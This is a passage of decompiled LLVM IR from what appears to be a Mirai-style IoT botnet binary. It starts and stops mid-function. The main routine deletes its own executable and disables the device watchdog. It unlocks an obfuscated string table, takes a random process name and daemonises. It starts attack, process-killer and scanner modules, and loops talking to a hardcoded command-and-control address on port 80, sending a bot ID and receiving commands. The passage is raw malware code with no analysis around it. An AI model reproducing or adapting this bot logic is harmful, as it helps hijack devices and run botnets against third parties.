  %v3_14154 = icmp eq i32 %v1_1414811, 0
  br i1 %v3_14154, label %dec_label_pc_1415c, label %dec_label_pc_140d4

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14144.backedge, %dec_label_pc_14144.preheader
  br label %dec_label_pc_14164

dec_label_pc_14164:                               ; preds = %dec_label_pc_14130, %dec_label_pc_140c8, %dec_label_pc_1415c
  %stack_var_-44.0.off0 = phi i8 [ 0, %dec_label_pc_140c8 ], [ 0, %dec_label_pc_1415c ], [ 1, %dec_label_pc_14130 ]
  ret i8 %stack_var_-44.0.off0

; uselistorder directives
  uselistorder i32 %matches_-20.09, { 1, 0 }
  uselistorder label %dec_label_pc_14164, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140d4, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8** %argv to i32
  %rdbuf_-1604 = alloca [1024 x i8], align 1
  %err_len_-196 = alloca i32, align 4
  %id_len_-193 = alloca i8, align 1
  %err_-192 = alloca i32, align 4
  %cli_addr_len_-188 = alloca i32, align 4
  %cli_addr_-184 = alloca i32, align 4
  %cli_addr_-180 = alloca i32, align 4
  %stack_var_-162 = alloca i32, align 4
  %timeo_-160 = alloca %timeval_1, align 8
  %fdsetwr_-452 = alloca %anon_struct_2.25, align 8
  %fdsetrd_-324 = alloca %anon_struct_2, align 8
  %id_buf_-140 = alloca [32 x i8], align 4
  %stack_var_-24 = alloca i32, align 4
  %name_buf_-104 = alloca [32 x i8], align 1
  %id_buf_-136 = alloca [32 x i8], align 1
  %sigs_-152 = alloca %anon_struct_1.23, align 8
  %sigs_-148 = alloca %anon_struct_1, align 8
  %stack_var_-4 = alloca i32, align 4
  store i32 82308, i32* %stack_var_-4, align 4
  %v2_14180 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_14180, i32* @fp, align 4
  %v1_141a0 = bitcast i8** %argv to i32*
  %v2_141a0 = load i32, i32* %v1_141a0, align 4
  %v1_141a8 = call i32 @unlink(i32 %v2_141a0)
  %v2_141ac = ptrtoint %anon_struct_1* %sigs_-148 to i32
  %v1_141b4 = getelementptr inbounds %anon_struct_1, %anon_struct_1* %sigs_-148, i32 0, i32 0, i32 0
  %v2_141b4 = call i32 @sigemptyset(i32* %v1_141b4)
  %v2_141c4 = call i32 @__GI_sigaddset(i32 %v2_141ac, i32 2)
  %v4_141d8 = call i32 @__GI_sigprocmask(i32 0, i32* %v1_141b4, i32 0)
  %v2_141e4 = call i32 @bsd_signal(i32 17, i32 1)
  %v2_141f0 = call i32 @bsd_signal(i32 5, i32 ptrtoint (i32* @global_var_14d04.119 to i32))
  %v3_141fc = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_22e60.121 to i32), i32 2)
  store i32 %v3_141fc, i32* @r3, align 4
  %v3_1420c = icmp eq i32 %v3_141fc, -1
  br i1 %v3_1420c, label %dec_label_pc_14214, label %dec_label_pc_14234

dec_label_pc_14214:                               ; preds = %entry
  %v3_1421c = call i32 @__libc_open(i32 ptrtoint ([19 x i8]* @global_var_22e70.123 to i32), i32 2)
  %v7_1422c = icmp eq i32 %v3_1421c, -1
  br i1 %v7_1422c, label %dec_label_pc_14268, label %dec_label_pc_14234

dec_label_pc_14234:                               ; preds = %entry, %dec_label_pc_14214
  %mfd_-56.0 = phi i32 [ %v3_1421c, %dec_label_pc_14214 ], [ %v3_141fc, %entry ]
  %v4_14238 = getelementptr inbounds %anon_struct_1.23, %anon_struct_1.23* %sigs_-152, i32 0, i32 0, i32 0
  store i32 1, i32* %v4_14238, align 8
  %v2_1423c = ptrtoint %anon_struct_1.23* %sigs_-152 to i32
  store i32 %v2_1423c, i32* @r3, align 4
  %v3_14254 = call i32 @ioctl(i32 %mfd_-56.0, i32 -2147199228, i32 %v2_1423c)
  %v1_1425c = call i32 @__GI___libc_close(i32 %mfd_-56.0)
  br label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %dec_label_pc_14214, %dec_label_pc_14234
  %v1_1426c = call i32 @chdir(i32 ptrtoint (i32* @global_var_22e84.125 to i32))
  %v0_14270 = call i32 @util_local_addr()
  store i32 %v0_14270, i32* @LOCAL_ADDR, align 4
  store i16 2, i16* bitcast (i32* @srv_addr to i16*), align 4
  %v1_14290 = call i32 @__GI_htonl(i32 1105119797)
  store i32 %v1_14290, i32* @global_var_2ed84.129, align 4
  %v1_142a4 = call i32 @__GI_htons(i32 80)
  %sext = mul i32 %v1_142a4, 65536
  %v1_142a8 = sdiv i32 %sext, 65536
  %v1_142b4 = trunc i32 %v1_142a8 to i16
  store i16 %v1_142b4, i16* bitcast (i32* @global_var_2ed82.130 to i16*), align 4
  %v2_142bc = load i32, i32* %v1_141a0, align 4
  %v1_142c0 = inttoptr i32 %v2_142bc to i8*
  %v4_142c4 = call i8 @unlock_tbl_if_nodebug(i8* %v1_142c0)
  %v2_142cc = icmp eq i8 %v4_142c4, 0
  br i1 %v2_142cc, label %dec_label_pc_142dc, label %dec_label_pc_142d4

dec_label_pc_142d4:                               ; preds = %dec_label_pc_14268
  %v1_142d8 = call i32 @__GI_raise(i32 5)
  br label %dec_label_pc_142dc

dec_label_pc_142dc:                               ; preds = %dec_label_pc_14268, %dec_label_pc_142d4
  call void @ensure_single_instance()
  call void @rand_init()
  %v2_142e4 = ptrtoint [32 x i8]* %id_buf_-136 to i32
  %tmp77 = getelementptr inbounds [32 x i8], [32 x i8]* %id_buf_-136, i32 0, i32 0
  call void @util_zero(i8* %tmp77, i32 32)
  %v7_142f8 = icmp eq i32 %argc, 2
  br i1 %v7_142f8, label %dec_label_pc_14300, label %dec_label_pc_1436c

dec_label_pc_14300:                               ; preds = %dec_label_pc_142dc
  %v1_14304 = add i32 %tmp, 4
  %v1_14308 = inttoptr i32 %v1_14304 to i32*
  %v2_14308 = load i32, i32* %v1_14308, align 4
  %v1_1430c = inttoptr i32 %v2_14308 to i8*
  %v3_14310 = call i32 @util_strlen(i8* %v1_1430c)
  %v8_1431c = icmp sgt i32 %v3_14310, 31
  br i1 %v8_1431c, label %dec_label_pc_1436c, label %dec_label_pc_14320

dec_label_pc_14320:                               ; preds = %dec_label_pc_14300
  %v2_14328 = load i32, i32* %v1_14308, align 4
  %v1_14334 = inttoptr i32 %v2_14328 to i8*
  %v6_14338 = call i32 @util_strcpy(i8* %tmp77, i8* %v1_14334)
  %v2_14344 = load i32, i32* %v1_14308, align 4
  store i32 %v2_14344, i32* @r4, align 4
  %v2_14350 = load i32, i32* %v1_14308, align 4
  %v1_14354 = inttoptr i32 %v2_14350 to i8*
  %v3_14358 = call i32 @util_strlen(i8* %v1_14354)
  %v0_14360 = load i32, i32* @r4, align 4
  %v1_14360 = inttoptr i32 %v0_14360 to i8*
  call void @util_zero(i8* %v1_14360, i32 %v3_14358)
  br label %dec_label_pc_1436c

dec_label_pc_1436c:                               ; preds = %dec_label_pc_142dc, %dec_label_pc_14300, %dec_label_pc_14320
  %v0_1436c = call i32 @rand_next()
  %v1_14374 = mul i32 %v0_1436c, 4
  %v3_14378 = and i32 %v1_14374, 12
  %v1_1437c = add nuw nsw i32 %v3_14378, 12
  %v2_14384 = ptrtoint [32 x i8]* %name_buf_-104 to i32
  %tmp78 = getelementptr inbounds [32 x i8], [32 x i8]* %name_buf_-104, i32 0, i32 0
  call void @rand_alphastr(i8* %tmp78, i32 %v1_1437c)
  %v2_1439c = ptrtoint i32* %stack_var_-24 to i32
  %v2_143a0 = add i32 %v2_1439c, -80
  %v2_143a4 = add i32 %v2_143a0, %v1_1437c
  %v3_143ac = inttoptr i32 %v2_143a4 to i8*
  store i8 0, i8* %v3_143ac, align 4
  %v2_143b4 = load i32, i32* %v1_141a0, align 4
  %v1_143bc = inttoptr i32 %v2_143b4 to i8*
  %v6_143c4 = call i32 @util_strcpy(i8* %v1_143bc, i8* %tmp78)
  %v0_143c8 = call i32 @rand_next()
  %v1_143d4 = zext i32 %v0_143c8 to i64
  %v4_143d4 = mul nuw i64 %v1_143d4, 2863311531
  %v3_143d82 = udiv i64 %v4_143d4, 17179869184
  %v2_143e44 = mul nuw nsw i64 %v3_143d82, 2
  %v2_143e4 = trunc i64 %v2_143e44 to i32
  %v3_143e86 = mul nuw nsw i64 %v3_143d82, 8
  %v3_143e8 = trunc i64 %v3_143e86 to i32
  %v2_143ec29 = sub i32 %v2_143e4, %v3_143e8
  %v2_143f0 = add i32 %v2_143ec29, %v0_143c8
  %v3_143fc = mul i32 %v2_143f0, 4
  %v1_14400 = add i32 %v3_143fc, 12
  call void @rand_alphastr(i8* %tmp78, i32 %v1_14400)
  %v2_14428 = add i32 %v2_143a0, %v1_14400
  %v3_14428 = inttoptr i32 %v2_14428 to i8*
  store i8 0, i8* %v3_14428, align 4
  %v5_14440 = call i32 @prctl(i32 15, i32 %v2_14384, i32 %v2_14428, i32 %v2_14384)
  call void @table_unlock_val(i8 2)
  %v2_14458 = bitcast [32 x i8]* %id_buf_-140 to i32*
  %v3_14458 = call i8* @table_retrieve_val(i32 2, i32* %v2_14458)
  %v5_14458 = ptrtoint i8* %v3_14458 to i32
  %v4_14464 = load i32, i32* %v2_14458, align 4
  store i32 %v4_14464, i32* @r3, align 4
  store i32 %v4_14464, i32* @r2, align 4
  %v2_14474 = call i32 @__GI___libc_write(i32 1, i32 %v5_14458)
  store i32 1, i32* @r2, align 4
  %v2_14484 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_22e88.133 to i32))
  call void @table_lock_val(i8 2)
  %v0_14490 = call i32 @__libc_fork()
  store i32 %v0_14490, i32* @r0, align 4
  %tmp79 = icmp slt i32 %v0_14490, 1
  br i1 %tmp79, label %dec_label_pc_144ac, label %dec_label_pc_144a0

dec_label_pc_144a0:                               ; preds = %dec_label_pc_1436c
  ret i32 0

dec_label_pc_144ac:                               ; preds = %dec_label_pc_1436c
  %v0_144ac = call i32 @__GI_setsid()
  %v1_144bc = call i32 @__GI___libc_close(i32 0)
  %v1_144c4 = call i32 @__GI___libc_close(i32 1)
  %v1_144cc = call i32 @__GI___libc_close(i32 2)
  %v1_144d0 = call i8 @attack_init()
  call void @killer_init()
  call void @scanner_init()
  %v2_144dc = ptrtoint %anon_struct_2* %fdsetrd_-324 to i32
  %v2_14518 = ptrtoint %anon_struct_2.25* %fdsetwr_-452 to i32
  %v4_146f8 = getelementptr inbounds %timeval_1, %timeval_1* %timeo_-160, i32 0, i32 0
  %v2_1470c = ptrtoint %timeval_1* %timeo_-160 to i32
  %v2_147ac = ptrtoint i32* %stack_var_-162 to i32
  %v2_14a80 = ptrtoint i32* %err_len_-196 to i32
  %v2_14b9c = ptrtoint [1024 x i8]* %rdbuf_-1604 to i32
  %tmp80 = getelementptr inbounds [1024 x i8], [1024 x i8]* %rdbuf_-1604, i32 0, i32 0
  %v2_148e8 = ptrtoint i32* %cli_addr_len_-188 to i32
  %v2_148ec = ptrtoint i32* %err_-192 to i32
  %v2_149c0 = ptrtoint i8* %id_len_-193 to i32
  %v2_1482c = ptrtoint i32* %cli_addr_-180 to i32
  %v2_14830 = ptrtoint i32* %cli_addr_-184 to i32
  %v1_14850 = sub i32 0, %v0_144ac
  br label %dec_label_pc_144f0.lr.ph

dec_label_pc_144f0.lr.ph:                         ; preds = %dec_label_pc_14c24, %dec_label_pc_14bf4, %dec_label_pc_14be0, %dec_label_pc_14bcc, %dec_label_pc_14ad8, %dec_label_pc_14ac4, %dec_label_pc_14ab0, %dec_label_pc_14a20, %dec_label_pc_14a10, %dec_label_pc_14974, %dec_label_pc_146b8, %dec_label_pc_14c94, %dec_label_pc_14c1c, %dec_label_pc_14b14, %dec_label_pc_14b00, %dec_label_pc_149e4, %dec_label_pc_14914, %dec_label_pc_148c8, %dec_label_pc_144ac
  %wfd_-60.0 = phi i32 [ 0, %dec_label_pc_144ac ], [ %wfd_-60.0, %dec_label_pc_146b8 ], [ %wfd_-60.1, %dec_label_pc_14a10 ], [ %wfd_-60.1, %dec_label_pc_14a20 ], [ %wfd_-60.1, %dec_label_pc_14ab0 ], [ %wfd_-60.1, %dec_label_pc_14ac4 ], [ %wfd_-60.1, %dec_label_pc_14ad8 ], [ %wfd_-60.1, %dec_label_pc_14b00 ], [ %wfd_-60.1, %dec_label_pc_14b14 ], [ %wfd_-60.1, %dec_label_pc_14bcc ], [ %wfd_-60.1, %dec_label_pc_14be0 ], [ %wfd_-60.1, %dec_label_pc_14bf4 ], [ %wfd_-60.1, %dec_label_pc_14c1c ], [ %wfd_-60.1, %dec_label_pc_14c24 ], [ %wfd_-60.1, %dec_label_pc_14c94 ], [ %wfd_-60.1, %dec_label_pc_148c8 ], [ %wfd_-60.1, %dec_label_pc_14974 ], [ %wfd_-60.1, %dec_label_pc_149e4 ], [ %wfd_-60.1, %dec_label_pc_14914 ]
  br label %dec_label_pc_144f0

dec_label_pc_144f0:                               ; preds = %dec_label_pc_144f0.lr.ph, %dec_label_pc_144f0
  %storemerge2026 = phi i32 [ 0, %dec_label_pc_144f0.lr.ph ], [ %v1_14504, %dec_label_pc_144f0 ]
  %v5_144fc = mul i32 %storemerge2026, 4
  %v6_144fc = add i32 %v5_144fc, %v2_144dc
  %v7_144fc = inttoptr i32 %v6_144fc to i32*
  store i32 0, i32* %v7_144fc, align 4
  %v1_14504 = add i32 %storemerge2026, 1
  %tmp84 = icmp ult i32 %v1_14504, 32
  br i1 %tmp84, label %dec_label_pc_144f0, label %dec_label_pc_1452c.lr.ph

dec_label_pc_1452c.lr.ph:                         ; preds = %dec_label_pc_144f0
  br label %dec_label_pc_1452c

dec_label_pc_1452c:                               ; preds = %dec_label_pc_1452c.lr.ph, %dec_label_pc_1452c
  %v4_1454882 = phi i32 [ 0, %dec_label_pc_1452c.lr.ph ], [ %v1_14540, %dec_label_pc_1452c ]
  %v5_14538 = mul i32 %v4_1454882, 4
  %v6_14538 = add i32 %v5_14538, %v2_14518
  %v7_14538 = inttoptr i32 %v6_14538 to i32*
  store i32 0, i32* %v7_14538, align 4
  %v1_14540 = add i32 %v4_1454882, 1
  %v4_14544 = inttoptr i32 %v1_14540 to %anon_struct_2*
  %v7_1454c = icmp eq %anon_struct_2* %v4_14544, inttoptr (i32 31 to %anon_struct_2*)
  %v2_14550 = icmp ule %anon_struct_2* %v4_14544, inttoptr (i32 30 to %anon_struct_2*)
  %v3_14550 = or i1 %v7_1454c, %v2_14550
  br i1 %v3_14550, label %dec_label_pc_1452c, label %dec_label_pc_14554

dec_label_pc_14554:                               ; preds = %dec_label_pc_1452c
  %v2_14558 = load i32, i32* @fd_ctrl, align 4
  %v7_1455c = icmp eq i32 %v2_14558, -1
  br i1 %v7_1455c, label %dec_label_pc_145c8, label %dec_label_pc_14564

dec_label_pc_14564:                               ; preds = %dec_label_pc_14554
  %v3_1456c = udiv i32 %v2_14558, 32
  %v3_14580 = mul nuw nsw i32 %v3_1456c, 4
  %v2_14588 = add i32 %v3_14580, %v2_1439c
  %v2_1458c = add i32 %v2_14588, -300
  %v1_14590 = inttoptr i32 %v2_1458c to i32*
  %v2_14590 = load i32, i32* %v1_14590, align 4
  %v1_1459c = urem i32 %v2_14558, 32
  %v6_145a4 = shl i32 1, %v1_1459c
  %v2_145a8 = or i32 %v2_14590, %v6_145a4
  store i32 %v2_145a8, i32* %v1_14590, align 4
  br label %dec_label_pc_145c8

dec_label_pc_145c8:                               ; preds = %dec_label_pc_14554, %dec_label_pc_14564
  %v2_145cc = load i32, i32* @fd_serv, align 4
  %v3_145d0 = icmp eq i32 %v2_145cc, -1
  br i1 %v3_145d0, label %dec_label_pc_145d8, label %dec_label_pc_145dc

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145c8
  call void @establish_connection()
  %v2_14658.pre = load i32, i32* @fd_serv, align 4
  br label %dec_label_pc_145dc

dec_label_pc_145dc:                               ; preds = %dec_label_pc_145c8, %dec_label_pc_145d8
  %v2_14688 = phi i32 [ %v2_145cc, %dec_label_pc_145c8 ], [ %v2_14658.pre, %dec_label_pc_145d8 ]
  %v2_145e0 = load i8, i8* @pending_connection, align 1
  %v2_145e4 = icmp eq i8 %v2_145e0, 0
  %v3_1465c = udiv i32 %v2_14688, 32
  %v3_14670 = mul nuw nsw i32 %v3_1465c, 4
  %v2_14678 = add i32 %v3_14670, %v2_1439c
  br i1 %v2_145e4, label %dec_label_pc_14654, label %dec_label_pc_145ec

dec_label_pc_145ec:                               ; preds = %dec_label_pc_145dc
  %v2_14614 = add i32 %v2_14678, -428
  %v1_14618 = inttoptr i32 %v2_14614 to i32*
  %v2_14618 = load i32, i32* %v1_14618, align 4
  %v1_14624 = urem i32 %v2_14688, 32
  %v6_1462c = shl i32 1, %v1_14624
  %v2_14630 = or i32 %v2_14618, %v6_1462c
  store i32 %v2_14630, i32* %v1_14618, align 4
  br label %dec_label_pc_146b8

dec_label_pc_14654:                               ; preds = %dec_label_pc_145dc
  %v2_1467c = add i32 %v2_14678, -300
  %v1_14680 = inttoptr i32 %v2_1467c to i32*
  %v2_14680 = load i32, i32* %v1_14680, align 4
  %v1_1468c = urem i32 %v2_14688, 32
  %v6_14694 = shl i32 1, %v1_1468c
  %v2_14698 = or i32 %v2_14680, %v6_14694
  store i32 %v2_14698, i32* %v1_14680, align 4
  br label %dec_label_pc_146b8

dec_label_pc_146b8:                               ; preds = %dec_label_pc_145ec, %dec_label_pc_14654
  %v2_146bc = load i32, i32* @fd_ctrl, align 4
  %v2_146c4 = load i32, i32* @fd_serv, align 4
  %v7_146cc = icmp sgt i32 %v2_146bc, %v2_146c4
  %storemerge = select i1 %v7_146cc, i32 %v2_146bc, i32 %v2_146c4
  store i32 10, i32* %v4_146f8, align 8
  %v1_14700 = add i32 %storemerge, 1
  %v5_14720 = call i32 @__libc_select(i32 %v1_14700, i32 %v2_144dc, i32 %v2_14518, i32 0, i32 %v2_1470c)
  %v7_14730 = icmp eq i32 %v5_14720, -1
  br i1 %v7_14730, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %dec_label_pc_146b8
  %v2_1473c = icmp eq i32 %v5_14720, 0
  br i1 %v2_1473c, label %dec_label_pc_14744, label %dec_label_pc_147c4

dec_label_pc_14744:                               ; preds = %dec_label_pc_14738
  store i32 0, i32* %stack_var_-162, align 4
  %v2_1475c = srem i32 %wfd_-60.0, 6
  %v2_14780 = icmp eq i32 %v2_1475c, 0
  %v1_14794 = add i32 %wfd_-60.0, 1
  %v2_1479c = icmp eq i1 %v2_14780, false
  br i1 %v2_1479c, label %dec_label_pc_147c4, label %dec_label_pc_147a4

dec_label_pc_147a4:                               ; preds = %dec_label_pc_14744
  %v2_147a8 = load i32, i32* @fd_serv, align 4
  %v5_147c0 = call i32 @__libc_send(i32 %v2_147a8, i32 %v2_147ac, i32 2, i32 16384)
  br label %dec_label_pc_147c4

dec_label_pc_147c4:                               ; preds = %dec_label_pc_14738, %dec_label_pc_14744, %dec_label_pc_147a4
  %wfd_-60.1 = phi i32 [ %v1_14794, %dec_label_pc_14744 ], [ %v1_14794, %dec_label_pc_147a4 ], [ %wfd_-60.0, %dec_label_pc_14738 ]
  %v2_147c8 = load i32, i32* @fd_ctrl, align 4
  %v7_147cc = icmp eq i32 %v2_147c8, -1
  br i1 %v7_147cc, label %dec_label_pc_14868, label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147c4
  %v3_147dc = udiv i32 %v2_147c8, 32
  %v3_147e8 = mul nuw nsw i32 %v3_147dc, 4
  %v2_147f0 = add i32 %v3_147e8, %v2_1439c
  %v2_147f4 = add i32 %v2_147f0, -300
  %v1_147f8 = inttoptr i32 %v2_147f4 to i32*
  %v2_147f8 = load i32, i32* %v1_147f8, align 4
  %v1_14804 = urem i32 %v2_147c8, 32
  %v6_148088 = lshr i32 %v2_147f8, %v1_14804
  %v1_14810 = urem i32 %v6_148088, 2
  %v2_14814 = icmp eq i32 %v1_14810, 0
  br i1 %v2_14814, label %dec_label_pc_14868, label %dec_label_pc_1481c

dec_label_pc_1481c:                               ; preds = %dec_label_pc_147d4
  store i32 16, i32* %cli_addr_-184, align 4
  %v5_1483c = call i32 @__libc_accept(i32 %v2_147c8, i32 %v2_1482c, i32 %v2_14830, i32 %v2_1482c, i32 16)
  call void @scanner_kill()
  call void @killer_kill()
  call void @attack_kill_all()
  %v2_1485c = call i32 @kill(i32 %v1_14850, i32 9)
  %v1_14864 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_14868

dec_label_pc_14868:                               ; preds = %dec_label_pc_147d4, %dec_label_pc_147c4, %dec_label_pc_1481c
  %v2_1486c = load i8, i8* @pending_connection, align 1
  %v2_14870 = icmp eq i8 %v2_1486c, 0
  br i1 %v2_14870, label %dec_label_pc_14a10, label %dec_label_pc_14878

dec_label_pc_14878:                               ; preds = %dec_label_pc_14868
  store i8 0, i8* @pending_connection, align 1
  %v2_14888 = load i32, i32* @fd_serv, align 4
  %v3_1488c = udiv i32 %v2_14888, 32
  %v3_14898 = mul nuw nsw i32 %v3_1488c, 4
  store i32 %v2_1439c, i32* @r1, align 4
  %v2_148a0 = add i32 %v3_14898, %v2_1439c
  %v2_148a4 = add i32 %v2_148a0, -428
  %v1_148a8 = inttoptr i32 %v2_148a4 to i32*
  %v2_148a8 = load i32, i32* %v1_148a8, align 4
  %v1_148b4 = urem i32 %v2_14888, 32
  %v6_148b89 = lshr i32 %v2_148a8, %v1_148b4
  %v1_148bc = urem i32 %v6_148b89, 2
  %v2_148c0 = icmp eq i32 %v1_148bc, 0
  br i1 %v2_148c0, label %dec_label_pc_148c8, label %dec_label_pc_148d0

dec_label_pc_148c8:                               ; preds = %dec_label_pc_14878
  call void @teardown_connection()
  br label %dec_label_pc_144f0.lr.ph

dec_label_pc_148d0:                               ; preds = %dec_label_pc_14878
  store i32 0, i32* %cli_addr_len_-188, align 4
  store i32 4, i32* %err_-192, align 4
  store i32 1, i32* @r1, align 4
  %v5_14904 = call i32 @getsockopt(i32 %v2_14888, i32 1, i32 4, i32 %v2_148e8, i32 %v2_148ec)
  %v3_14908 = load i32, i32* %cli_addr_len_-188, align 4
  %v2_1490c = icmp eq i32 %v3_14908, 0
  br i1 %v2_1490c, label %dec_label_pc_14974, label %dec_label_pc_14914

dec_label_pc_14914:                               ; preds = %dec_label_pc_148d0
  %v2_14918 = load i32, i32* @fd_serv, align 4
  %v1_14920 = call i32 @__GI___libc_close(i32 %v2_14918)
  store i32 -1, i32* @fd_serv, align 4
  %v0_14930 = call i32 @rand_next()
  %v1_1493c = zext i32 %v0_14930 to i64
  %v4_1493c = mul nuw i64 %v1_1493c, 3435973837
  %v3_1494010 = udiv i64 %v4_1493c, 34359738368
  %v2_1494c12 = mul nuw nsw i64 %v3_1494010, 2
  %v2_1494c = trunc i64 %v2_1494c12 to i32
  %v3_1495014 = mul nuw nsw i64 %v3_1494010, 8
  %v3_14950 = trunc i64 %v3_1495014 to i32
  %v2_14954.neg = sub i32 %v0_14930, %v2_1494c
  %v2_14958 = sub i32 %v2_14954.neg, %v3_14950
  %v1_14964 = add i32 %v2_14958, 1
  %v1_1496c = call i32 @sleep(i32 %v1_14964)
  br label %dec_label_pc_144f0.lr.ph

dec_label_pc_14974:                               ; preds = %dec_label_pc_148d0
  %v3_1497c = call i32 @util_strlen(i8* %tmp77)
  %v1_14988 = trunc i32 %v3_1497c to i8
  store i8 %v1_14988, i8* %id_len_-193, align 1
  %v0_1498c = call i32 @util_local_addr()
  store i32 %v0_1498c, i32* @LOCAL_ADDR, align 4
  %v2_149a0 = load i32, i32* @fd_serv, align 4
  %v4_149b4 = call i32 @__libc_send(i32 %v2_149a0, i32 ptrtoint (i32* @global_var_22e8c.140 to i32), i32 4, i32 16384)
  %v2_149bc = load i32, i32* @fd_serv, align 4
  %v4_149d4 = call i32 @__libc_send(i32 %v2_149bc, i32 %v2_149c0, i32 1, i32 16384)
  %v3_149d8 = load i8, i8* %id_len_-193, align 1
  %v2_149dc = icmp eq i8 %v3_149d8, 0
  br i1 %v2_149dc, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_149e4

dec_label_pc_149e4:                               ; preds = %dec_label_pc_14974
  %v4_149d8 = zext i8 %v3_149d8 to i32
  %v2_149e8 = load i32, i32* @fd_serv, align 4
  %v4_14a08 = call i32 @__libc_send(i32 %v2_149e8, i32 %v2_142e4, i32 %v4_149d8, i32 16384)
  br label %dec_label_pc_144f0.lr.ph

dec_label_pc_14a10:                               ; preds = %dec_label_pc_14868
  %v2_14a14 = load i32, i32* @fd_serv, align 4
  %v7_14a18 = icmp eq i32 %v2_14a14, -1
  br i1 %v7_14a18, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14a20

dec_label_pc_14a20:                               ; preds = %dec_label_pc_14a10
  %v3_14a28 = udiv i32 %v2_14a14, 32
  %v3_14a34 = mul nuw nsw i32 %v3_14a28, 4
  %v2_14a3c = add i32 %v3_14a34, %v2_1439c
  %v2_14a40 = add i32 %v2_14a3c, -300
  %v1_14a44 = inttoptr i32 %v2_14a40 to i32*
  %v2_14a44 = load i32, i32* %v1_14a44, align 4
  %v1_14a50 = urem i32 %v2_14a14, 32
  %v6_14a5416 = lshr i32 %v2_14a44, %v1_14a50
  %v1_14a5c = urem i32 %v6_14a5416, 2
  %v2_14a60 = icmp eq i32 %v1_14a5c, 0
  br i1 %v2_14a60, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14a68

dec_label_pc_14a68:                               ; preds = %dec_label_pc_14a20
  %v0_14a68 = call i32 @__GI___errno_location()
  %v2_14a74 = inttoptr i32 %v0_14a68 to i32*
  store i32 0, i32* %v2_14a74, align 4
  %v2_14a7c = load i32, i32* @fd_serv, align 4
  %v4_14a98 = call i32 @__libc_recv(i32 %v2_14a7c, i32 %v2_14a80, i32 2, i32 16386)
  %v3_14aa8 = icmp eq i32 %v4_14a98, -1
  br i1 %v3_14aa8, label %dec_label_pc_14ab0, label %dec_label_pc_14af4

dec_label_pc_14ab0:                               ; preds = %dec_label_pc_14a68
  %v0_14ab0 = call i32 @__GI___errno_location()
  %v1_14ab8 = inttoptr i32 %v0_14ab0 to i32*
  %v2_14ab8 = load i32, i32* %v1_14ab8, align 4
  %v7_14abc = icmp eq i32 %v2_14ab8, 11
  br i1 %v7_14abc, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14ac4

dec_label_pc_14ac4:                               ; preds = %dec_label_pc_14ab0
  %v0_14ac4 = call i32 @__GI___errno_location()
  %v1_14acc = inttoptr i32 %v0_14ac4 to i32*
  %v2_14acc = load i32, i32* %v1_14acc, align 4
  %v7_14ad0 = icmp eq i32 %v2_14acc, 11
  br i1 %v7_14ad0, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14ad8

dec_label_pc_14ad8:                               ; preds = %dec_label_pc_14ac4
  %v0_14ad8 = call i32 @__GI___errno_location()
  %v1_14ae0 = inttoptr i32 %v0_14ad8 to i32*
  %v2_14ae0 = load i32, i32* %v1_14ae0, align 4
  %v7_14ae4 = icmp eq i32 %v2_14ae0, 4
  br i1 %v7_14ae4, label %dec_label_pc_144f0.lr.ph, label %dec_label_pc_14aec

dec_label_pc_14aec:                               ; preds = %dec_label_pc_14ad8
  br label %dec_label_pc_14af4

dec_label_pc_14af4:                               ; preds = %dec_label_pc_14a68, %dec_label_pc_14aec
  %n_-28.0 = phi i32 [ 0, %dec_label_pc_14aec ], [ %v4_14a98, %dec_label_pc_14a68 ]
  %v2_14af8 = icmp eq i32 %n_-28.0, 0
  br i1 %v2_14af8, label %dec_label_pc_14b00, label %dec_label_pc_14b08

dec_label_pc_14b00:                               ; preds = %dec_label_pc_14af4
  call void @teardown_connection()
  br label %dec_label_pc_144f0.lr.ph

dec_label_pc_14b08:                               ; preds = %dec_label_pc_14af4
  %v3_14b08 = load i32, i32* %err_len_-196, align 4
  %v2_14b0c = icmp eq i32 %v3_14b08, 0
  br i1 %v2_14b0c, label %dec_label_pc_14b14, label %dec_label_pc_14b38

dec_label_pc_14b14:                               ; preds = %dec_label_pc_14b08
  %v2_14b18 = load i32, i32* @fd_serv, align 4
  %v4_14b30 = call i32 @__libc_recv(i32 %v2_14b18, i32 %v2_14a80, i32 2, i32 16384)
  br label %dec_label_pc_144f0.lr.ph

dec_label_pc_14b38:                               ; preds = %dec_label_pc_14b08
  %v1_14b40 = call i32 @__GI_ntohs(i32 %v3_14b08)
  %sext17 = mul i32 %v1_14b40, 65536
  %v1_14b44 = sdiv i32 %sext17, 65536
  store i32 %v1_14b44, i32* %err_len_-196, align 4
  %tmp85 = icmp eq i32 %sext17, 67108864
  %v2_14b54 = icmp ult i32 %v1_14b44, 1024
  %v3_14b54 = or i1 %tmp85, %v2_14b54
  br i1 %v3_14b54, label %dec_label_pc_14b74, label %dec_label_pc_14b58

dec_label_pc_14b58:                               ; preds = %dec_label_pc_14b38
  %v2_14b5c = load i32, i32* @fd_serv, align 4
  %v1_14b64 = call i32 @__GI___libc_close(i32 %v2_14b5c)
  store i32 -1, i32* @fd_serv, align 4
  br label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b38, %dec_label_pc_14b58
  %v0_14b74 = call i32 @__GI___errno_location()
  %v2_14b80 = inttoptr i32 %v0_14b74 to i32*
  store i32 0, i32* %v2_14b80, align 4
  %v2_14b88 = load i32, i32* @fd_serv, align 4
  %v3_14b8c = load i32, i32* %err_len_-196, align 4
  %v4_14bb4 = call i32 @__libc_recv(i32 %v2_14b88, i32 %v2_14b9c, i32 %v3_14b8c, i32 16386)
  %v3_14bc4 = icmp eq i32 %v4_14bb4, -1
  br i1 %v3_14bc4, label %dec_label_pc_14bcc, label %dec_label_pc_14c10

